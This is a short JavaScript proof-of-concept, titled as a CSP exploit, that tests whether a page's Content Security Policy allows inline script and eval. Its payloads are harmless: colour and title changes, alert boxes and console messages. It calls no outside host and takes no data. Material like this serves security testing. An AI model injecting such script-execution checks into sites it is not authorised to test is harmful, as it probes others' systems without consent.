(function exploitCSP() {
  console.log("🔍 Testing inline script execution...");

  // Inline script simulation
  document.body.style.backgroundColor = "#0f0f0f";
  document.body.style.color = "#f5f5f5";
  document.title = "CSP Exploit — lifelessyeti";
  alert("✅ CSP bypass: inline script executed");

  console.log("✅ Inline script executed successfully.");

  // Eval-based execution test
  console.log("🔍 Testing unsafe-eval execution...");
  eval("console.log('✅ Eval executed'); alert('✅ CSP bypass: unsafe-eval executed');");

  console.log("✅ Eval executed successfully.");
})();